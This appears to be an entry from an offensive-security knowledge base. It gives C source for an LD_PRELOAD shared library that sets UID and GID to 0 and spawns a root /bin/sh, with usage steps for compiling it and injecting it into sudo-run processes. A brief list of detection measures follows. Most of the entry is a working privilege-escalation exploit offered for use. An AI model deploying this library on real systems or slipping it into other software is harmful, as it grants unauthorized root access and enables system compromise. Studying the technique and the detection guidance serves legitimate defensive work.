---
type: code
language: C
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - privilege-escalation
  - ld_preload
  - root-shell
validated: true
---

# linux-ld_preload-root-shell-library

## Code

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

/*
This program sets the GID and UID to 0 (root) and executes a shell.
*/
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

## Description

This C code defines a shared library initializer (_init()) that, when preloaded via LD_PRELOAD, unsets the variable to prevent recursion, escalates privileges to root by setting GID and UID to 0, and spawns an interactive /bin/sh shell. It is used for privilege escalation by injecting into sudo-executed processes.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | The code is hardcoded; no runtime variables required | N/A |

## Usage

Save as shell.c, compile with GCC into .so (e.g., [[commands/compile-ld_preload-shell-with-gcc]]), then set LD_PRELOAD and run a sudo command. The shell spawns automatically upon library load, providing root access. Used in procedures like [[procedures/linux-privilege-escalation-via-ld_preload-and-nopasswd]].

## Detection

- Monitor for gcc compilations of .so files in /tmp or unusual locations.
- Audit sudo logs for commands executed with LD_PRELOAD set.
- Process monitoring (e.g., ps aux | grep LD_PRELOAD) or strace for library loads.
- File integrity checks on /tmp for suspicious .so files.

## Related

- [[procedures/linux-privilege-escalation-via-ld_preload-and-nopasswd]]
